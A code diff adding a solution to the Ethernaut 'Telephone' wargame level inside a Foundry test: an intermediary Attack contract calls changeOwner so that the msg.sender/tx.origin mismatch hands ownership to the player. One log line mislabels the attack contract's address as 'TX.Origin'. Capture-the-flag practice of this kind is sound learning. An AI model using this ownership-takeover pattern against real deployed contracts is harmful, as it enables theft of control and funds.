@@ -34,10 +34,30 @@ contract TestTelephone is BaseTest {
     }
 
     function exploitLevel() internal override {
-        vm.startPrank(player, player);
+        vm.startPrank(player);
 
         /** CODE YOUR EXPLOIT HERE */
+        // https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768
+
+        emit log_named_address("Current Telephone Owner", level.owner());
+        // creating a new contract - to simulate tx.origin attack
+        Attack attack = new Attack(level);
+        attack.attack();
+        emit log_named_address("New Telephone Owner", level.owner());
+        emit log_named_address("TX.Origin", address(attack));
 
         vm.stopPrank();
+    }
+}
+
+contract Attack {
+    Telephone private telephone;
+
+    constructor(Telephone _telephone) public {
+        telephone = Telephone(_telephone);
+    }
+
+    function attack() public {
+        telephone.changeOwner(msg.sender);
     }
 }
